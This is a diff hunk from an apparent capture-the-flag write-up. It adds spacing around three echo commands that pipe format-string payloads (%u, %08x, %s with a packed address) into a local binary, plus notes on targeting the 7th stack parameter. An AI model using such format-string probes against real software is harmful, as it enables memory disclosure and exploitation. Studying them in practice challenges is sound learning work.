@@ -748,9 +748,13 @@ Match on line: 7
 ```
 
 **Brute Force**:
+
 Not 100% where to go from here, but this is a thing.
+
 `echo -e 'AAAA|%u%u%u%u%u%u|%08x|' | ./binary`
+
 `echo -e '\x4c\xa0\x04\x08|%u%u%u%u%u%u|%08x|' | ./binary`
+
 `echo -e '\x4c\xa0\x04\x08|%u%u%u%u%u%u|___________%%|%s|' | ./binary`
 
 Now we know that we're targeting the 7th parameter on the stack, we can test it on current known strings. Radare tells us that a string "cat_._authenticated.txt" exists at 0x80487b2.
